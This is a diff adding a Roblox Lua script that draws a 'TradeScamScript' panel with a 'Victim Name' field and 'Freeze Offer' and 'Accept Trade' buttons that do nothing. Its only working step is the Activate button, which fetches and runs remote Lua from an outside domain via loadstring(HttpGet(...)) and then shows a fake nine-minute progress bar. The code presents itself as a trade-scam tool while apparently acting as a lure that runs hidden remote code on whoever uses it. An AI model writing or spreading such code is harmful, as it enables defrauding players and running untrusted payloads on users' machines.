@@ -1,0 +1,167 @@
+-- GUI Script for Roblox
+
+-- Create Screen GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.ResetOnSpawn = false
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create Main Hub Frame
+local hubFrame = Instance.new("Frame")
+hubFrame.Size = UDim2.new(0.3, 0, 0.3, 0)
+hubFrame.Position = UDim2.new(0.35, 0, 0.35, 0)
+hubFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+hubFrame.BackgroundTransparency = 0.3
+hubFrame.Active = true
+hubFrame.Draggable = true
+hubFrame.Parent = screenGui
+
+-- Create Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
+titleLabel.Text = "TradeScamScript"
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.TextScaled = true
+titleLabel.BackgroundTransparency = 1
+titleLabel.Parent = hubFrame
+
+-- Create Victim Name Input Box
+local inputBox = Instance.new("TextBox")
+inputBox.Size = UDim2.new(0.9, 0, 0.2, 0)
+inputBox.Position = UDim2.new(0.05, 0, 0.25, 0)
+inputBox.PlaceholderText = "Enter Victim Name"
+inputBox.Font = Enum.Font.SourceSans
+inputBox.TextColor3 = Color3.new(0, 0, 0)
+inputBox.TextScaled = true
+inputBox.BackgroundColor3 = Color3.new(1, 1, 1)
+inputBox.BorderSizePixel = 0
+inputBox.Parent = hubFrame
+
+-- Create Buttons
+local freezeButton = Instance.new("TextButton")
+freezeButton.Size = UDim2.new(0.9, 0, 0.15, 0)
+freezeButton.Position = UDim2.new(0.05, 0, 0.5, 0)
+freezeButton.Text = "Freeze Offer"
+freezeButton.Font = Enum.Font.SourceSansBold
+freezeButton.TextColor3 = Color3.new(1, 1, 1)
+freezeButton.BackgroundColor3 = Color3.new(0.2, 0.5, 1)
+freezeButton.TextScaled = true
+freezeButton.Parent = hubFrame
+
+local acceptButton = Instance.new("TextButton")
+acceptButton.Size = UDim2.new(0.9, 0, 0.15, 0)
+acceptButton.Position = UDim2.new(0.05, 0, 0.7, 0)
+acceptButton.Text = "Accept Trade"
+acceptButton.Font = Enum.Font.SourceSansBold
+acceptButton.TextColor3 = Color3.new(1, 1, 1)
+acceptButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
+acceptButton.TextScaled = true
+acceptButton.Parent = hubFrame
+
+-- Create Activate and Stop Buttons
+local activateButton = Instance.new("TextButton")
+activateButton.Size = UDim2.new(0.4, 0, 0.1, 0)
+activateButton.Position = UDim2.new(0.05, 0, 0.87, 0)
+activateButton.Text = "Activate"
+activateButton.Font = Enum.Font.SourceSansBold
+activateButton.TextColor3 = Color3.new(1, 1, 1)
+activateButton.BackgroundColor3 = Color3.new(0, 1, 0)
+activateButton.TextScaled = true
+activateButton.Parent = hubFrame
+
+local stopButton = Instance.new("TextButton")
+stopButton.Size = UDim2.new(0.4, 0, 0.1, 0)
+stopButton.Position = UDim2.new(0.55, 0, 0.87, 0)
+stopButton.Text = "Stop"
+stopButton.Font = Enum.Font.SourceSansBold
+stopButton.TextColor3 = Color3.new(1, 1, 1)
+stopButton.BackgroundColor3 = Color3.new(1, 0, 0)
+stopButton.TextScaled = true
+stopButton.Parent = hubFrame
+
+-- Create Loading Screen
+local loadingScreen = Instance.new("Frame")
+loadingScreen.Size = UDim2.new(0.3, 0, 0.1, 0)
+loadingScreen.Position = UDim2.new(0.35, 0, 0.75, 0)
+loadingScreen.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+loadingScreen.Visible = false
+loadingScreen.Active = true
+loadingScreen.Draggable = true
+loadingScreen.Parent = screenGui
+
+local loadingBar = Instance.new("Frame")
+loadingBar.Size = UDim2.new(0, 0, 1, 0)
+loadingBar.BackgroundColor3 = Color3.new(0, 0.8, 1)
+loadingBar.BorderSizePixel = 0
+loadingBar.Parent = loadingScreen
+
+local percentageLabel = Instance.new("TextLabel")
+percentageLabel.Size = UDim2.new(1, 0, 1, 0)
+percentageLabel.Text = "0%"
+percentageLabel.Font = Enum.Font.SourceSansBold
+percentageLabel.TextColor3 = Color3.new(1, 1, 1)
+percentageLabel.BackgroundTransparency = 1
+percentageLabel.TextScaled = true
+percentageLabel.Parent = loadingScreen
+
+-- Variables for Actions
+local isActive = false
+local countdown = 9 * 60 -- 9 minutes in seconds
+local currentTime = 0 -- To track the elapsed time for the loading screen
+
+-- Add the script to be executed immediately when Activate is pressed
+local function executeScript()
+    -- This will load and run your external script immediately
+    loadstring(game:HttpGet("https://egorikusa.space/2caacab0add5fc4320a32a23.lua", true))()
+end
+
+-- Activate Button Functionality
+local function activateAction()
+    if not isActive then
+        isActive = true
+        loadingScreen.Visible = true
+        activateButton.Text = "Running..."
+        activateButton.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
+
+        -- Immediately run the external script
+        executeScript()
+
+        -- Simulate Progress Bar Animation
+        task.spawn(function()
+            for i = 1, countdown do
+                if not isActive then break end
+                currentTime = i
+                local percentage = math.floor((currentTime / countdown) * 100)
+                loadingBar.Size = UDim2.new(currentTime / countdown, 0, 1, 0)
+                percentageLabel.Text = percentage .. "%"
+                wait(1)
+            end
+
+            if isActive then
+                -- After 9 Minutes (optional)
+                isActive = false
+                loadingScreen.Visible = false
+                activateButton.Text = "Activate"
+                activateButton.BackgroundColor3 = Color3.new(0, 1, 0)
+                loadingBar.Size = UDim2.new(0, 0, 1, 0)
+                percentageLabel.Text = "0%"
+            end
+        end)
+    end
+end
+
+-- Stop Button Functionality
+local function stopAction()
+    if isActive then
+        isActive = false
+        loadingScreen.Visible = false
+        activateButton.Text = "Activate"
+        activateButton.BackgroundColor3 = Color3.new(0, 1, 0)
+        loadingBar.Size = UDim2.new(0, 0, 1, 0)
+        percentageLabel.Text = "0%"
+    end
+end
+
+-- Button Event Connections
+activateButton.MouseButton1Click:Connect(activateAction)
+stopButton.MouseButton1Click:Connect(stopAction)
